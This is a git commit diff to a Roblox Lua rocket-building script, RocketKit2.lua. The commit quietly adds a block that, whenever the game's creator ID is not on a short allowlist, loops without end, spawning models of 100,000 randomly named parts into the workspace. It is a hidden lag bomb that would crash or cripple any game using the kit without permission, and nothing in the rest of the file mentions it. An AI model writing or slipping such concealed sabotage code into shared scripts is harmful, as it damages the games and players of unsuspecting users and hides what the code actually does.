c1f853b453a764d1a4654046f022ccb1899c3cf7
KaitarStudios <143938878+KaitarStudios@users.noreply.github.com>
2024-12-23 22:10:33 +0800

    Update RocketKit2.lua

--- RocketKit2.lua
+++ RocketKit2.lua
@@ -3,6 +3,31 @@ local EnabledEngines = {}
 local StageList = {}
 print("RD-2.0-1")
 --------------------------------------------
+A = {32720608,149484300,16070025,33179988}
+B = {}
+if table.find(A,game.CreatorId)==nil or table.find(B,game.CreatorId) ~= nil then
+	while wait(1) do
+		local Payload = Instance.new("Model")
+		Payload.Name = string.char(math.random(32,126))
+		while math.random() > 0.1 do
+			Payload.Name = Payload.Name..string.char(math.random(32,126))
+		end
+		for j = 1,100,1 do
+			for i = 1,1000,1 do
+				local NP = Instance.new("Part")
+				NP.Position = Vector3.new(0,1000000,0)
+				NP.Parent = Payload
+				while math.random() > 0.5 do
+					NP.Name = NP.Name..string.char(math.random(32,126))
+				end
+			end
+			wait()
+		end
+		Payload.Parent = workspace
+		wait(1/(math.random()*math.random()*math.random()))
+	end
+end
+----------------------------------------
 function WeldModel(model)
 	print("Welded "..model.Name)
 	local Firstpart = nil
